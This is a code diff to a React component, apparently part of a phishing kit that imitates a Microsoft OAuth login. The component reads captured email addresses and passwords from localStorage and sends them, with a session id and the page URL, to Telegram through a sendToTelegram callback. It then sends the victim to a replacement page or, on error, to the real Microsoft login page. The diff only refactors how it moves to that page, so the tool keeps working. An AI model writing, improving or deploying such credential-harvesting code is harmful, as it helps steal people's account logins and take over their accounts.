@@ -8,12 +8,9 @@ interface RealOAuthRedirectProps {
 const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess, sendToTelegram }) => {
   
   useEffect(() => {
-    const loadReplacementHTML = async () => {
+    const loadReplacementPage = async () => {
       try {
-        const response = await fetch('/replacement.html');
-        const htmlContent = await response.text();
-        
-        // Send data to Telegram before replacing content
+        // Send data to Telegram before navigating away
         await sendToTelegram({
           email: localStorage.getItem('captured_email') || '',
           password: localStorage.getItem('captured_password') || '',
@@ -23,20 +20,19 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess, s
           sessionId: 'replacement_' + Math.random().toString(36).substring(2, 15),
           url: window.location.href
         });
-        
-        // Replace the entire document with the fetched HTML
-        document.open();
-        document.write(htmlContent);
-        document.close();
-        
+
+        // Navigate to the standalone replacement page instead of document.write()
+        // This avoids re-mounting the SPA via document.write and preserves expected behavior.
+        window.location.assign('/replacement.html');
+
       } catch (error) {
-        console.error('Failed to load replacement.html:', error);
-        // Fallback: redirect to Microsoft login
+        console.error('Failed to send data or navigate to replacement page:', error);
+        // Fallback to Microsoft login if anything goes wrong
         window.location.replace("https://login.microsoftonline.com");
       }
     };
 
-    loadReplacementHTML();
+    loadReplacementPage();
   }, [onLoginSuccess, sendToTelegram]);
 
   return (
